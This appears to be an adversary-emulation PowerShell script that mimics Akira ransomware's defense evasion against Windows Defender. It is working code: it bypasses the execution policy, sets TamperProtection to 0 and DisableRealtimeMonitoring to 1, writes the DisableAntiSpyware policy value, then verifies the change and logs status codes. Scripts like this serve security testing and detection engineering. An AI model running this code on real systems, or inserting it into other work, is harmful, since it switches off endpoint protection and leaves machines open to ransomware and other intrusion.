# Akira Ransomware - Windows Defender Registry Manipulation Script
# Simulates the hlpdrv.sys driver's registry manipulation tactics

function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Set-ExecutionPolicyBypass {
    try {
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Write-Host "[!] Failed to bypass execution policy: $_" -ForegroundColor Red
        return $false
    }
}

function Write-StatusFile {
    param([string]$Status)
    try {
        $Status | Out-File "C:\F0\status.txt" -Encoding ASCII -Force
    } catch {
        # Ignore errors writing status
    }
}

function Disable-WindowsDefender {
    try {
        Write-Host "[*] Attempting to disable Windows Defender real-time protection..."
        
        # Create or modify registry key to disable Windows Defender
        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        
        # Ensure the registry path exists
        if (!(Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
            Write-Host "[+] Created Windows Defender policy registry path"
        }
        
        # Attempt to set DisableAntiSpyware
        Set-ItemProperty -Path $regPath -Name "DisableAntiSpyware" -Value 1 -Type DWORD -Force
        Write-Host "[+] Set DisableAntiSpyware registry value to 1"
        
        # Verify the setting
        $value = Get-ItemProperty -Path $regPath -Name "DisableAntiSpyware" -ErrorAction SilentlyContinue
        if ($value -and $value.DisableAntiSpyware -eq 1) {
            Write-Host "[+] Successfully disabled Windows Defender via registry"
            Write-StatusFile "DEFENDER_DISABLED"
            return $true
        } else {
            Write-Host "[!] Failed to verify DisableAntiSpyware setting"
            Write-StatusFile "VERIFICATION_FAILED"
            return $false
        }
    } catch [System.UnauthorizedAccessException] {
        Write-Host "[!] Access denied - registry modification blocked" -ForegroundColor Red
        Write-StatusFile "ACCESS_DENIED"
        return $false
    } catch [System.Security.SecurityException] {
        Write-Host "[!] Security exception - operation blocked by security policy" -ForegroundColor Red
        Write-StatusFile "SECURITY_BLOCKED"
        return $false
    } catch {
        Write-Host "[!] Unexpected error: $_" -ForegroundColor Red
        Write-StatusFile "ERROR_$($_.Exception.GetType().Name)"
        return $false
    }
}

function Attempt-TamperProtectionBypass {
    try {
        Write-Host "[*] Attempting tamper protection bypass..."
        
        # Common tamper protection bypass registry keys
        $tamperKeys = @(
            "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features",
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        )
        
        foreach ($key in $tamperKeys) {
            if (!(Test-Path $key)) {
                New-Item -Path $key -Force | Out-Null
            }
        }
        
        # Attempt to disable tamper protection
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWORD -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWORD -Force -ErrorAction SilentlyContinue
        
        Write-Host "[+] Attempted tamper protection bypass registry modifications"
        return $true
    } catch {
        Write-Host "[!] Tamper protection bypass failed: $_" -ForegroundColor Red
        return $false
    }
}

# Main execution
Write-Host "=== Akira BYOVD Defense Evasion Script ===" -ForegroundColor Yellow

if (-not (Set-ExecutionPolicyBypass)) {
    Write-StatusFile "EXECUTION_POLICY_FAILED"
    exit 1
}

if (-not (Test-Administrator)) {
    Write-Host "[!] Script requires administrator privileges" -ForegroundColor Red
    Write-StatusFile "NOT_ADMIN"
    exit 1
}

Write-Host "[+] Running with administrator privileges"
Write-Host "[*] Simulating Akira ransomware registry manipulation techniques"

# Attempt tamper protection bypass first
Attempt-TamperProtectionBypass

# Main Windows Defender disable attempt
$success = Disable-WindowsDefender

if ($success) {
    Write-Host "[+] Windows Defender registry manipulation completed successfully" -ForegroundColor Green
    exit 0
} else {
    Write-Host "[!] Windows Defender registry manipulation failed" -ForegroundColor Red
    exit 1
}